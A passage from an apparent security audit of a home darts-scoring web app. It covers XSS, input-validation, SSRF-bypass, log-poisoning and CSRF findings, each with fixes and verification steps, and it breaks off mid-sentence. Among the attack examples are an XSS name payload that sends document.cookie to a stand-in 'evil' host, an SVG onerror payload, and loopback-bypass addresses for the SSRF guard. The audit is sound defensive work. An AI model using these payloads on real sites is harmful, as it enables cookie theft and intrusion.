`String(name).trim()` + non-empty. No max length, no charset policy.

**Attack:** (a) this is the raw material for SEC-12 — any character reaches the client.
(b) A name can be up to ~1MB (bounded only by `readJson`'s body cap), and names are stored
and echoed into many views, canvases, and the live payload — a handful of giant names
bloats storage and every render. Low impact on a single-household box, but unbounded
free-text from an unauthenticated caller is exactly what the threat model wants bounded.

**Fix (step by step):**
1. In `addPlayer()` and `renamePlayer()`, after `trim()`, reject names longer than a sane
   cap (e.g. 64 chars) with a 400. Optionally normalize/collapse whitespace.
2. Keep the charset permissive (people want emoji/apostrophes in names) — the real defense
   against injection is consistent output escaping (SEC-12), not an input charset filter.
   But do reject control characters (`\x00-\x1f`) which have no legitimate use in a name.
3. Mirror the same cap in the frontend `maxlength` for a nicer UX (belt and braces).

**Verify:** a 5000-char name and a name with a raw newline are both rejected with 400.

---

### SEC-14 — Several write endpoints accept unbounded / unvalidated free-form fields  **(LOW, data-integrity + minor storage-DoS when auth is off)**

**Status: ✅ Fixed**, with one deliberate scope decision noted below. All four
call sites now validate at the write boundary, each with a committed
`node:test`:
- `awardBadge()`/`revokeBadge()`: new `validateBadgeId()` rejects anything not
  matching `^[a-z0-9_]{1,64}$`. This is a **shape bound, not an exact
  enumeration** — there is no single canonical badge-id registry shared between
  frontend and backend today (ids live only in `frontend/index.html`'s
  `BADGE_INFO` plus the dynamically-generated Just Chuckin' It milestone-ladder
  ids), and building a duplicate exact list here would be a second place to keep
  in sync on every new badge — the exact "same meaning in two places" drift risk
  this codebase avoids elsewhere. Every existing badge id was checked against
  this shape and matches. Tested in `db.badges.test.js`.
- `createGame()`: `gameType` is now checked against the existing
  `KNOWN_GAME_TYPES` whitelist (400 on unknown), `category` capped at 64
  characters, serialized `config` capped at 4096 bytes. Tested in
  `db.turn-validation.test.js`.
- `startChallengeAttempt()`/`completeChallengeAttempt()`: `challengeDate` now
  validated against the same `^\d{4}-\d{2}-\d{2}$` regex the read side already
  uses, `format` validated against `CHALLENGE_BETTER_DIRECTION`'s known keys.
  This is the same fix as `docs/bug-roadmap.md` **BUG-1**. Tested in
  `db.challenges.test.js`.
- `recordEvent()`: `eventType` checked against a new `KNOWN_EVENT_TYPES` list
  (the exact 6 types `frontend/index.html`'s `DB.recordEvent()` ever sends).
  Tested in `db.turn-validation.test.js`.

All 4 file locations return 400 for the bad-input cases the fix sketch below
calls out, verified both by the committed tests and a live Playwright smoke
test confirming ordinary X01/Cricket/Chuckin gameplay still creates and plays
normally after the change.

**Where / what:** all of these are parameterized (so **not** SQL injection) but accept
values with no whitelist or bound, so in the default auth-off config an unauthenticated
client can write junk that pollutes stats/leaderboards or grows the DB:

- `awardBadge()` / `revokeBadge()` (`db.js`) — `badgeId` is any string. Anyone can award
  an arbitrary or real badge to any player, or inflate a real badge's `count` without
  limit. Leaderboard/badge-case pollution.
- `createGame()` (`db.js`) — `gameType` is `gameType || 'x01'` with **no whitelist** (a
  bogus type is stored; it then silently escapes every typed stat query — see BUG-2 in the
  bug roadmap), `category` is an unbounded string, and `config` is an arbitrary object
  `JSON.stringify`'d into the row (no size cap).
- `startChallengeAttempt()` (`db.js`) — `challengeDate` and `format` are stored via bare
  `String(...)` with no `^\d{4}-\d{2}-\d{2}$` / known-format check (the *read* side —
  `getChallengeStatus`/`resetChallengeAttempt` — DOES validate the date, so a bad-date row
  is written but then unreachable; see BUG-1 in the bug roadmap).
- `recordEvent()` (`db.js`) — `eventType` is any string.

**Attack:** none of these is a takeover or injection path; the impact is (a) corrupted /
spammable stats and badges, and (b) unbounded table growth from an unauthenticated source
when `OCHE_REQUIRE_AUTH=false` (the open-LAN opt-out). The global 300-req/60s/IP limiter
(SEC-3) bounds the *rate* but not the *total*, and multiple IPs bypass the per-IP cap.

**Fix (step by step):**
1. `awardBadge`/`revokeBadge`: validate `badgeId` against the known badge-id set (the same
   list the Badge Case already knows) and reject unknown ids with 400. Optionally cap
   `count` at a sane ceiling.
2. `createGame`: whitelist `gameType` against `KNOWN_GAME_TYPES` (already defined in
   `db.js`) and reject unknown; bound `category` length (e.g. ≤64) and the serialized
   `config` size (e.g. ≤4KB).
3. `startChallengeAttempt`/`completeChallengeAttempt`: validate `challengeDate` with the
   same `^\d{4}-\d{2}-\d{2}$` regex used on the read side, and `format` against the six
   known formats; reject otherwise with 400.
4. `recordEvent`: whitelist `eventType` against the known event types.
5. Broadly: the single biggest lever for an internet-exposed box is
   `OCHE_REQUIRE_AUTH` staying at its zero-trust default (on) — with it on, every
   write above requires an admin session, which removes the anonymous-pollution
   angle entirely. These per-field validations are defense-in-depth on top of that.

**Verify:** an award with a made-up `badgeId`, a `createGame` with `gameType:'evil'`, and a
`startChallengeAttempt` with `challengeDate:'not-a-date'` each return 400.

---

### Residual risk reaffirmed (not a new finding)

**Only under the documented opt-out** (`OCHE_REQUIRE_AUTH=false`, for a fully-trusted
household LAN), every write endpoint (including `POST /api/live`, which re-broadcasts to
all `/display` screens) is unauthenticated — an attacker on the network can inject fake
games, spam stats, or hijack the scoreboard "billboard" (the payload is key-whitelisted
and size-capped by `sanitizeLiveState`, and `display.html` escapes every field, so this
is annoyance, not XSS). This is the documented open-LAN trade-off (see the threat model
at the top), not something that happens under the zero-trust default. For any
internet-exposed deployment the mitigation is simply leaving `OCHE_REQUIRE_AUTH` at its
default (`true`) behind a TLS-terminating reverse proxy — see the SEC-6 checklist.
Reaffirming it here so a future reader doesn't mistake the opt-out for an oversight.

## Suggested order for Part 4

1. ~~**SEC-12** (XSS) — real, cheap, do it first.~~ ✅
2. ~~**SEC-13** (name bounds) — cheap, and it shrinks SEC-12's raw material.~~ ✅
3. ~~**SEC-14** (validate write inputs) — mostly data-integrity; pairs with the bug-roadmap
   items BUG-1/BUG-2 that share the same missing-validation root cause.~~ ✅

**Every finding in Part 4 is now closed**, alongside `docs/bug-roadmap.md`'s
BUG-1/BUG-2/BUG-3 (fixed in the same pass — see that doc).

---

## Part 5 — Third-pass audit (2026-07, after the single-elimination tournament feature)

A fresh adversarial read scoped to the newly-added tournament mode (`db.js`'s
tournament section, the `/api/tournaments*` routes in `server.js`, and the
tournament UI in `frontend/index.html`), plus a re-check of the invariants the
earlier passes established. The SQLi / auth-primitive / path-traversal / CSRF /
SSRF-egress surfaces were re-checked against the new code and remain safe (all
tournament SQL is parameterized; the only interpolated identifier in
`_advanceTournamentMatch` is a hardcoded `'player1_id'`/`'player2_id'` column name
chosen by a `=== 1` test, never user input; tournament routes reuse the same
`requireWrite` gate and add no new outbound requests or credentials). One new
finding, plus its two functional-defect counterparts in `docs/bug-roadmap.md`
(BUG-4, BUG-5).

### SEC-15 — Stored XSS via a player name in the tournament bracket view  **(MED, unauthenticated in the default-off config)**

**Status: ✅ Fixed (2026-07).** All three tournament sinks (`renderTournamentDetail()`'s
Up Next Walkover button and `askTournamentWalkover()`'s two confirm-modal buttons) now
wrap the player name as `escapeHtml(escapeJs(name))`, the file's established pattern.
The three `renderBackups()` handlers (`downloadBackup`/`askRestoreBackup`/
`askDeleteBackup`) got the same wrap as defense-in-depth (BUG-3 precedent), even
though they were never exploitable (server-generated, regex-filtered filenames). The
"zero bare `escapeJs`" invariant is re-established: a grep for `escapeJs(` not
preceded by `escapeHtml(` across `frontend/index.html` now returns only the `escapeJs`
function definition itself. Verified end-to-end against a live server with
`OCHE_REQUIRE_AUTH=false`: created a player named
`x"><img src=x onerror="window.__xss=1">`, added it to a tournament, opened the
bracket detail and the Walkover confirm modal in a headless browser — `window.__xss`
stayed `0`, no `onerror` image request fired, and the name rendered as literal escaped
text in both the `onclick` attributes and the visible labels.

**Original finding:** This is a re-introduction of the exact SEC-12 pattern in code
written after SEC-12 was closed — the tournament UI, added in the single-elim
feature, interpolates player names into **double-quoted** `onclick="..."` attributes
using **`escapeJs(name)` only**, without the outer `escapeHtml` that SEC-12
established as this file's mandatory pattern. The SEC-12 fix's "there should be zero
bare `escapeJs`" invariant has drifted.

**Where:** `frontend/index.html`, three sinks, all rendering tournament participant
names into an `onclick` attribute:

- `renderTournamentDetail()` — the "Up Next" list's Walkover button:
  ```js
  onclick="askTournamentWalkover(${m.id}, '${escapeJs(m.player1Name)}', '${escapeJs(m.player2Name)}')"
  ```
- `askTournamentWalkover()` — the two winner-choice buttons in its confirm modal:
  ```js
  onclick="submitTournamentWalkover(${matchId}, '${escapeJs(p1)}')"   // and p2
  ```

`escapeJs()` escapes `\` and `'` but **not** `"`, `<`, or `>`. The visible button
*text* at each site correctly uses `escapeHtml(...)`; only the `onclick` attribute is
unescaped — the same asymmetry SEC-12 had.

**Attack:** identical mechanism and impact to SEC-12. Player names have a permissive
charset server-side (SEC-13 bounds only length and control characters — `"`/`<`/`>`
are all allowed). With `OCHE_REQUIRE_AUTH=false` (the open-LAN opt-out), anyone can
`POST /api/players` with a name like:

```
x"><img src=x onerror=fetch('//evil/'+document.cookie)>
```

then `POST /api/tournaments` including that name in `players[]` (both public writes
when auth is off). Any round-1 match with two known players is immediately `ready`, so
the poisoned name renders in the "Up Next" Walkover button. When an admin opens that
tournament's detail view, the un-escaped `"` closes the `onclick`, `>` closes the
`<button>`, and the injected `<img onerror>` runs **in the admin's authenticated
session** — no click required. The session cookie is `HttpOnly`, but the injected
script can call any admin API (create an admin, change a password, wipe data, or
forge the tournament-advancement call that BUG-4 leaves unguarded) using the admin's
ambient session. Anonymous → admin escalation, exactly as SEC-12. Under the zero-trust
default (`OCHE_REQUIRE_AUTH=true`) only admins create players/tournaments, narrowing
the cross-privilege angle, but a name could have been planted before auth was enabled
or under the `false` opt-out, so the fix is defense-in-depth regardless.

**Fix (step by step):**
1. In `renderTournamentDetail()` and `askTournamentWalkover()`, change all three sinks
   to the file's established pattern: `escapeHtml(escapeJs(name))` (e.g.
   `onclick="askTournamentWalkover(${m.id}, '${escapeHtml(escapeJs(m.player1Name))}', '${escapeHtml(escapeJs(m.player2Name))}')"`).
   Nothing else changes — the display text already uses `escapeHtml`.
2. **Same-class defense-in-depth cleanup** (BUG-3 precedent): `renderBackups()`'s
   three backup-name handlers (`downloadBackup`/`askRestoreBackup`/`askDeleteBackup`)
   also use bare `escapeJs`. They are **not** exploitable today — backup filenames are
   server-generated and `listBackups()` filters them through
   `BACKUP_NAME_RE = /^darts-[0-9TZ.-]+\.db$/`, a charset with no `"`/`<`/`>` — but
   they're the same "safe only because a validator elsewhere constrains the input"
   coupling SEC-12/BUG-3 flagged, and admin-only. Wrap them in
   `escapeHtml(escapeJs(...))` too so the whole file is consistent again.
3. Re-establish the invariant as a guard: a grep for `escapeJs(` **not** immediately
   preceded by `escapeHtml(` across `frontend/index.html` should return **zero**
   matches (today it returns the three tournament sinks, the three backup sinks, and
   the `escapeJs` definition itself — after this fix, only the definition).

**Verify:** create a player named `x"><img src=x onerror=window.__xss=true>`, add it to
a tournament, open the tournament's detail view, and confirm `window.__xss` stays
`false`, no image request fires, and the name renders as literal escaped text in both
the Walkover button's `onclick` and the confirm-modal buttons.

---

### Residual risk note (tournament, auth-off)

The tournament write endpoints (`POST /api/tournaments`, `.../start`, `.../walkover`)
extend the same documented auth-off residual as every other write: under
`OCHE_REQUIRE_AUTH=false`, an anonymous LAN client can create tournaments (which
auto-creates any novel player names via `ensurePlayer`, up to 128 per tournament) and
drive their matches, spamming rows. This is the already-documented open-LAN tradeoff
(see "Residual risk reaffirmed" in Part 4), not a new finding — the mitigation is the
zero-trust default plus the SEC-3 global rate limiter. Reaffirmed here only so a reader
auditing the new endpoints doesn't mistake it for an oversight.

## Suggested order for Part 5

1. **SEC-15** (XSS) — real, cheap, and it also removes the delivery vehicle for
   exploiting BUG-4 through an admin session. Do it first. Pair the fix with a
   re-assertion of the "zero bare `escapeJs`" grep invariant so this doesn't drift a
   third time.
2. Then `docs/bug-roadmap.md` **BUG-4** (tournament advancement validation) and
   **BUG-5** (legs/sets bounds) — data-integrity hardening on the same feature.

---

## Part 6 — Fourth-pass audit (2026-07, whole-codebase breadth)

A deliberate breadth-first re-read of the **entire** codebase, weighted evenly across
every module rather than concentrated on the newest features — auth primitives,
session/cookie handling, the SSRF egress guard, backup/restore, the CLI recovery
script, every server route's gate and input validation, the stat/challenge/badge
logic in `db.js`, the full-database export and the bulk-wipe operations, and the
`display.html` untrusted-live-payload render path. Most surfaces re-confirmed safe and
unchanged from earlier passes:

- **auth.js** — 256-bit random session tokens, SHA-256 at rest, scrypt +
  `timingSafeEqual` with a length guard, `HttpOnly`/`SameSite=Strict`/`Path=/` cookies
  with a conditional `Secure`. `login()` pays a constant scrypt cost before any
  lockout/existence branch (no timing oracle); `getSessionAdmin()` enforces expiry on
  read. Sound.
- **Session/admin management** — `deleteAdmin()` refuses to remove the last admin;
  `changeAdminPassword()` invalidates all of that admin's sessions. Sound.
- **backup-lib.js** — filenames validated against `BACKUP_NAME_RE` before any `fs`
  call, magic-byte + `PRAGMA integrity_check` before staging a restore, WAL/SHM
  cleanup. `download` sets `Content-Disposition` from a `path.basename` of an
  already-validated name (no header injection). Sound.
- **display.html** — every player name from the untrusted `/api/live` payload is
  rendered through `escapeHtml`; the two `textContent` sinks are safe by construction.
  No XSS via the live billboard.
- **SQL** — re-confirmed parameterized throughout; `getMetricHistory`'s `metric` only
  selects a `switch` branch (never interpolated), and its `tz`/`start`/`end`
  interpolations are the already-validated integer/`YYYY-MM-DD` values (the
  documented-safe items in Part 3).

One new security finding (**SEC-16**), plus two functional-defect counterparts in
`docs/bug-roadmap.md` (**BUG-6**, **BUG-7**) — all three are cross-cutting gaps where
something added later wasn't wired into an existing whole-system mechanism, which is
exactly the "nothing slips through the cracks" class this pass was looking for.

### SEC-16 — SSRF egress guard doesn't block `0.0.0.0/8` or IPv6 `::`, re-opening the loopback pivot SEC-4 closed  **(MED)**

**Status: ✅ Fixed (2026-07).** `backend/netguard.js`'s `isLoopbackOrLinkLocal()` now
blocks `0.0.0.0/8` (`o[0] === 0`), the IPv6 unspecified address `::` (in any spelling,
via a new `isUnspecifiedIPv6()` all-zero-hextet check), and the limited broadcast
`255.255.255.255`. IPv4-mapped IPv6 is now normalized to its embedded v4 via a shared
`embeddedIPv4()` helper that handles **both** the dotted (`::ffff:127.0.0.1`) and hex
(`::ffff:7f00:1`) spellings, and `isPrivateRange()` uses the same helper so the hex
form can't bypass the private-range check either. New committed
`backend/test/netguard.test.js` locks in the full blocked-range list (loopback,
unspecified, link-local, broadcast, cloud metadata, IPv4-mapped both spellings) and
confirms public/LAN addresses still pass; `resolveAllowedHost('0.0.0.0')` and
`resolveAllowedHost('::')` now reject. Verified: the exact bypass IPs from the
finding (`0.0.0.0`, `0.0.0.1`, `0.1.2.3`, `::`, `::0`, `0:0:0:0:0:0:0:0`,
`255.255.255.255`, `::ffff:7f00:1`) are all blocked; `8.8.8.8`/`192.168.1.5`/
`2606:4700:4700::1111` still allowed.

**Original finding:**

**Where:** `backend/netguard.js` `isLoopbackOrLinkLocal()`. The IPv4 branch blocks
`127.0.0.0/8` (`o[0] === 127`) and `169.254.0.0/16`, but **not** `0.0.0.0/8`
(`o[0] === 0`). The IPv6 branch blocks `::1` and `fe80::/10`, but **not** the
unspecified address `::`. Verified empirically:

```
0.0.0.0            loopback/link-local-blocked: false
0.0.0.1            loopback/link-local-blocked: false
0.1.2.3            loopback/link-local-blocked: false
::                 loopback/link-local-blocked: false
255.255.255.255    loopback/link-local-blocked: false
127.0.0.1 / ::1 / 169.254.169.254 / ::ffff:127.0.0.1 : correctly blocked
```

**Attack:** on Linux, connecting a client socket to `0.0.0.0` (or any `0.x.x.x`
address in the `0.0.0.0/8` "this host on this network" block) reaches a service
listening on the local host — the kernel treats `connect(0.0.0.0)` as loopback. IPv6
`::` behaves the same way for a local IPv6 listener. So an admin-set (or, per SEC-4's
threat model, a phished/coerced/settings-write-influenced) `ha_url` of
`http://0.0.0.0:<port>/` or `http://[::]:<port>/` passes `resolveAllowedHost()` — the
resolved address isn't in any blocked range — and `fireHaWebhook()` / `POST /api/ha-test`
then connect straight to a loopback service. This is precisely the loopback probe SEC-4
was written to prevent (`http://127.0.0.1:<port>` is blocked, but its `0.0.0.0`
equivalent is not), so the SEC-4 defense is bypassable as written. `169.254.169.254`
(cloud metadata) is still correctly blocked, so the highest-value metadata target is
covered — this is the loopback/other-local-service angle of the same finding.

**Fix (step by step):**
1. In `isLoopbackOrLinkLocal()`'s IPv4 branch, add `if (o[0] === 0) return true;`
   (blocks the whole `0.0.0.0/8` "this-network"/"this-host" range, of which `0.0.0.0`
   itself is the reachable-as-loopback case).
2. In the IPv6 branch, block the unspecified address: `if (norm === '::' || norm === '::0' || /^0*:0*:/.test(...)) return true;` — simplest is to normalize and check for the all-zeros address explicitly (and treat a `NaN` first-group from a leading `::` conservatively as blocked, since a leading-`::` form is either the unspecified address or an IPv4-mapped/compressed form that should be range-checked, not silently allowed).
3. Defense-in-depth (same function, cheap): also block the IPv4 broadcast
   `255.255.255.255` and the IPv4-mapped-IPv6 **hex** form of loopback
   (`::ffff:7f00:1`), which the current dotted-quad-only regex
   (`/^::ffff:(\d+\.\d+\.\d+\.\d+)$/`) doesn't catch — normalize IPv4-mapped addresses
   to their embedded v4 before the range checks rather than relying on the dotted-quad
   spelling.
4. Add a committed `node:test` for `netguard.js` asserting `0.0.0.0`, `0.0.0.1`, `::`,
   and `255.255.255.255` are all rejected by `resolveAllowedHost` (they resolve to
   themselves as literals) and that legitimate LAN addresses (`192.168.x.x`) still pass
   with `HA_BLOCK_PRIVATE` unset.

**Verify:** set `ha_url` to `http://0.0.0.0:8046/` (the app's own port) and confirm
`POST /api/ha-test` now refuses with the loopback/link-local error rather than
connecting; confirm a normal LAN HA URL still works.

## Suggested order for Part 6

1. **SEC-16** (SSRF loopback bypass) — the one security finding; small, self-contained,
   and it re-closes a defense (SEC-4) that's currently bypassable. Do it with the
   `netguard.js` regression test so this range list has coverage going forward.
2. Then `docs/bug-roadmap.md` **BUG-7** (bulk-wipe leaves orphaned tournament rows —
   visible incorrectness after a destructive admin action) and **BUG-6** (JSON export
   omits the tournament tables). Both are "new table not wired into an existing
   whole-system operation" — worth fixing together and adding a standing checklist item
   (see BUG-6's fix) so the next new table doesn't repeat it.

---

## Part 7 — Fifth-pass audit (2026-07, unauthenticated malformed-input → unhandled decode/parse)

A fresh adversarial read looking specifically for a class the earlier passes didn't
target: **client-controlled input that reaches an unhandled `decodeURIComponent()` /
`JSON.parse()`**, whose throw then becomes a `500` and — because `server.js`'s
top-level `catch` persists every `status >= 500` to the `server_errors` table — an
*unauthenticated write into a security-relevant diagnostic surface*. The
SQLi/XSS/auth-primitive/path-traversal/SSRF surfaces were re-checked against the whole
codebase and remain safe (the "zero bare `escapeJs`" invariant still holds; the
`display.html` live-payload render path still escapes every field; `netguard.js` still
blocks the full SEC-16 range list). One new finding, plus its functional-defect
counterpart in `docs/bug-roadmap.md` (**BUG-9** — `completeGame()` accepts a
non-participant winner, the same "hardened at one consumer, not at the source" shape as
SEC-16/BUG-4).

### SEC-17 — Unauthenticated `server_errors` diagnostic-log poisoning via malformed client input  **(LOW→MED, unauthenticated)**

**Status: ✅ Fixed (2026-07).** All three decode/parse sites now classify a malformed
input as a `400` client error instead of letting it throw into the generic 500 +
`server_errors` path: `serveStatic()` wraps its `decodeURIComponent` and returns `400`
on failure; `auth.js` `parseCookies()` falls back to the raw value if a cookie value
won't decode (so a malformed cookie just fails to match a session); and `readJson()`
tags a `JSON.parse` failure with `status: 400`/`'Invalid JSON body'` before rejecting.
Committed regression test `backend/test/server.input-hardening.test.js` confirms
`GET /%ff` → 400, a malformed-cookie `GET /api/me` → 200 (`loggedIn:false`), a
malformed-body `POST /api/login` → 400, and — the load-bearing assertion — that
`getServerErrors()` stays **empty** after a burst of all three. `REFERENCE.md`'s §1
"Server error log" and the `server_errors` schema entry both document the
malformed-input-is-a-400 invariant. Full backend suite green.

**Where:** three separate client-input decode/parse sites throw an *unhandled*
exception that propagates to `server.js`'s top-level `catch`, which classifies any
non-`.status` throw as `500` and calls `db.logServerError(...)`:

1. `backend/server.js` `serveStatic()` — `decodeURIComponent(req.url.split('?')[0])`
   throws `URIError: URI malformed` on an invalid escape (e.g. `GET /%ff`). The
   WHATWG `new URL()` at the top of the handler does **not** reject `%ff` in the path,
   so it reaches `serveStatic` and throws there.
2. `backend/auth.js` `parseCookies()` — `out[k] = decodeURIComponent(v)` throws on a
   malformed cookie value (e.g. `Cookie: oche_session=%ff`). Reachable on the **public**
   `GET /api/me` (which calls `currentAdmin()` → `parseCookies()`), and on every
   admin route, before any auth check.
3. `backend/server.js` `readJson()` — `JSON.parse(raw)` throws `SyntaxError` on a
   malformed body. Reachable pre-auth on `POST /api/login`, `/api/setup`, and
   `/api/players/verify-pin`; and on every write endpoint under the
   `OCHE_REQUIRE_AUTH=false` LAN opt-out.

**Attack (verified against a live server):** `GET /api/me` with `Cookie:
oche_session=%ff`, `GET /%ff`, and `POST /api/login` with body `{bad json` each
returned **500** and each wrote a row into `server_errors`:

```
500  GET   /api/me     URI malformed
500  GET   /%ff        URI malformed
500  POST  /api/login  Expected property name or '}' in JSON at position 1 ...
```

Two concrete harms, both from an **unauthenticated** attacker:

- **Diagnostic-log poisoning / eviction.** `server_errors` is capped at the most
  recent 500 rows (`pruneServerErrors`), is surfaced to admins in Settings, and is the
  self-hoster's only shell-free view of "what's been going wrong" (§1's "Server error
  log"). An attacker can emit these bogus 500s up to the global rate limit
  (300/60s/IP, and more from multiple IPs) and **flush every genuine diagnostic entry
  out of the 500-row window** — an anti-forensics / log-drowning primitive on an
  internet-exposed box, plus a table full of attacker-chosen `message` text.
- **Misclassified status.** Each is a *client* error (malformed request) that should be
  a `400`, not a `500` — so it also inflates the app's own 5xx signal and `console.error`
  noise with expected client mistakes.

None of these is RCE or data loss; the impact is on the integrity/usefulness of the
diagnostic surface and the correctness of the status code. But the whole point of
`logServerError()` being `status >= 500`-only (Part 4's standing practice) is that a
4xx is "an expected client mistake, not a server fault worth a diagnostic entry" — and
these three inputs *are* expected client mistakes currently being logged as faults.

**Fix (step by step):**
1. `serveStatic()`: wrap the `decodeURIComponent` in a `try/catch` and return `400`
   (`{ error: 'Bad request' }`) on failure, so a malformed path is a client error, not
   a thrown 500.
2. `parseCookies()`: guard the per-cookie `decodeURIComponent(v)` — on throw, fall
   back to the raw `v` (or skip that pair) rather than letting the whole request 500.
   A malformed cookie then simply fails to match a session (treated as not-logged-in),
   which is the correct outcome.
3. `readJson()`: in the `end` handler's `catch`, tag the error as a client error
   before rejecting — `e.status = 400; e.message = 'Invalid JSON body';` — so the
   top-level `catch` returns `400` and does **not** persist it to `server_errors`
   (which only logs `status >= 500`).
4. Add committed `node:test` coverage: `parseCookies` on a malformed value returns an
   object without throwing; `readJson` rejects a malformed body with `err.status ===
   400`; and (server-level) `GET /%ff` / a malformed-cookie `GET /api/me` / a
   malformed-body `POST /api/login` each return `400` and leave `getServerErrors()`
   empty.
5. **Standing practice (add to the list at the top of Part 3 / "Standing practice"):**
   any new site that `decodeURIComponent`s or `JSON.parse`s client-controlled input
   must treat a throw as a `400`, never let it fall through to the generic `500` +
   `server_errors` path.

**Verify:** the four inputs above each return `400`; `server_errors` stays empty after
a burst of them; a genuine forced 5xx (an actual unexpected throw) still logs as
before.

## Suggested order for Part 7

1. **SEC-17** — small, self-contained, closes an unauthenticated write into the
   diagnostic surface and fixes three misclassified statuses at once. Pair the fix with
   the `node:test` coverage above so the "malformed client input is a 400, never a
   logged 500" invariant has a regression guard.
2. Then `docs/bug-roadmap.md` **BUG-9** (`completeGame()` participant validation) —
   the functional counterpart, same "guard the source, not just one consumer" theme as
   SEC-16/BUG-4.

---

## Part 8 — Sixth-pass audit (2026-07, whole-codebase general review)

A general code-review pass across the whole app (not scoped to a single new feature),
covering `backend/server.js`, `backend/db.js`, `backend/auth.js`, `backend/netguard.js`,
`backend/backup-lib.js`, `backend/admin-recovery.js`, `frontend/scoring.js`,
`frontend/index.html`, and `frontend/display.html` — including the Guided Around the
Clock/World and Checkout Trainer/League Mode surfaces merged since Part 7. Re-checked
and still safe: SQL injection (every interpolated query fragment traces to an internal
whitelisted constant; `_scope()` defensively validates `gameType` against
`KNOWN_GAME_TYPES` even though callers never pass raw request input), path traversal,
the SEC-16 SSRF range list (including DNS-rebinding and both IPv4-mapped-IPv6
spellings), brute-force protection on every credential surface, and the "zero bare
`escapeJs`" / consistent-`escapeHtml` invariant across `index.html`'s 127 render sites.
Two new gaps found — one in `display.html`'s live-payload heatmap tooltip (SEC-18, the
one escaping gap in an otherwise-consistent file) and one structural (SEC-19, no
`Content-Type` enforcement on writes). Five more lower-severity hardening gaps
(SEC-20 through SEC-24). Functional-defect counterparts for this same pass are
`docs/bug-roadmap.md` **BUG-10** through **BUG-15**.

### SEC-18 — Unescaped live-payload field in `display.html`'s Chuckin heatmap tooltip → stored/reflected XSS on the scoreboard  **(MED)**

**Status: ✅ Fixed (2026-07).** `buildChuckinLiveHeatmap()` now coerces `c.sector`,
`c.multiplier`, and `c.hits` to `Number(...) || 0` when building its lookup map,
before any of them can reach the `<title>` markup — the same "trust nothing from the
payload, coerce at the boundary" pattern this file's own `num()` helper already
applies everywhere else. Committed regression test
`backend/test/display.heatmap-hardening.test.js` extracts the function directly out
of `frontend/display.html`'s real source (via a targeted regex into a `vm` context,
so the test exercises the actual shipped code, not a hand-copied duplicate) and
confirms: a crafted non-numeric `hits`/`sector`/`multiplier` value never appears
verbatim in the output and never injects an event-handler attribute; the SVG
document's own closing `</svg>` still appears exactly once, at the end; legitimate
numeric hit counts still render correctly. Verified the test fails against the
pre-fix code (via a stash-and-rerun check) and passes against the fix. Full backend
suite green (539/539).

**Where:** `frontend/display.html` `buildChuckinLiveHeatmap()` (feeds
`renderers.chuckin.card()` and `renderers.around_the_clock`/`around_the_world`'s shared
`buildOutcomeGridCompact()` neighbor code):

```js
const hitMap = {};
(cells||[]).forEach(c=>{ hitMap[c.sector+'_'+c.multiplier] = c.hits; ... });
...
s += `<path ... ><title>${n}: ${hits(n,1)} single hit${hits(n,1)===1?'':'s'}</title></path>`;
```

`c.hits` comes straight from the `/api/live` broadcast payload (`players[].heatmap[]`,
part of the unrestricted-shape per-player array `ALLOWED_LIVE_KEYS` deliberately lets
through — see the comment at `server.js`'s `ALLOWED_LIVE_KEYS` definition) and is
interpolated into SVG `<title>` markup that's assigned to `grid.innerHTML` in
`renderState()`. Every other player-controlled string reaching `display.html`'s DOM
goes through `esc()`/`escapeHtml()` (127+ consistent call sites elsewhere in the file,
including the sibling `cricketMarkGlyph()` and every player-name interpolation) — this
is the one place a payload value is trusted as a safe number without either coercion
or escaping.

**Attack:** whoever can `POST /api/live` (any device on the LAN when
`OCHE_REQUIRE_AUTH=false`; an admin session otherwise) sets
`players[0].heatmap[0].hits` to a string like `</title><image href=x onerror=alert(document.cookie)>`
instead of a number. `liveBroadcast()` re-sends it verbatim to every connected `/display`
screen, whose `renderState()` assigns the built SVG string via `innerHTML`, executing
the payload on every open scoreboard — a genuine stored/broadcast XSS reaching every
screen in the room, not just the attacker's own client.

**Fix (step by step):**
1. In `buildChuckinLiveHeatmap()`, coerce `c.hits` (and `c.sector`/`c.multiplier`, used
   as object-key components) to `Number(...) || 0` when building `hitMap`, the same
   "trust nothing from the payload, coerce at the boundary" pattern `num()` already
   applies to every other live-state numeric field in this file.
2. Belt-and-braces: route the tooltip text itself through the file's existing `esc()`
   even after coercion, so a future field added to this same map without the coercion
   habit doesn't reopen the gap.
3. Add a committed `node:test` (or a scratch Node script under `backend/test/`, since
   `display.html`'s functions aren't currently extracted into a testable module) that
   feeds `buildChuckinLiveHeatmap()` a crafted non-numeric `hits` value and asserts the
   returned SVG string contains no unescaped `<`/`>` from that input — or, if that
   function isn't easily unit-tested in isolation yet, a live Playwright check posting
   a crafted `/api/live` payload and confirming no script executes on `/display`.

**Verify:** a crafted `hits` string in a `POST /api/live` payload renders as inert text
(or `0`) on `/display`, not executable markup; the tooltip still shows the real hit
count for legitimate numeric payloads.

### SEC-19 — No `Content-Type` enforcement on write endpoints → CSRF via cross-origin "simple" requests when `OCHE_REQUIRE_AUTH=false`  **(MED, conditional on the LAN-trust opt-out)**

**Status: ✅ Fixed (2026-07).** `readJson()` now rejects any request whose
`Content-Type` isn't `application/json` (an optional `; charset=...` suffix is
tolerated) with `415`, before reading any body bytes — implemented together with
BUG-10/SEC-21 since all three touch the same function. Committed regression test
`backend/test/server.request-body-hardening.test.js` ("SEC-19" describe block)
confirms: `Content-Type: text/plain` on a write route returns 415 and performs no
write; no `Content-Type` header at all also returns 415; `application/json;
charset=utf-8` still succeeds. Every existing `index.html` call site already sends
`Content-Type: application/json` via the shared `Backend` helper, so this is not a
behavior change for legitimate same-origin use — confirmed by the full backend suite
staying green (535/535) after the change. Full backend suite green.

**Where:** `backend/server.js` `readJson()` and every `requireWrite`-gated route. A
browser may send a cross-origin POST with a body and no CORS preflight as long as it
qualifies as a ["simple" request](https://fetch.spec.whatwg.org/#simple-header) —
which includes `Content-Type: text/plain` bodies. `readJson()` `JSON.parse`s the raw
body regardless of the request's actual `Content-Type` header, so a same-origin-only
API is reachable from an arbitrary third-party page's `fetch(..., {method:'POST',
body: JSON.stringify(...)})` (which browsers send as `text/plain` by default unless
told otherwise) as long as the visitor's browser can route to the server's address.

**Attack:** under the documented `OCHE_REQUIRE_AUTH=false` LAN-trust opt-out (writes
open to anyone who can reach the server, no session cookie involved), a malicious
webpage visited by anyone on the same network as the Oche box can silently POST to
`/api/games/:id/turns`, `/api/badges/award`, `/api/live`, or `/api/ha-webhook` through
that visitor's browser — recording fake turns, spamming the live scoreboard (see
SEC-18), or firing Home Assistant webhooks — with no interaction beyond the visitor
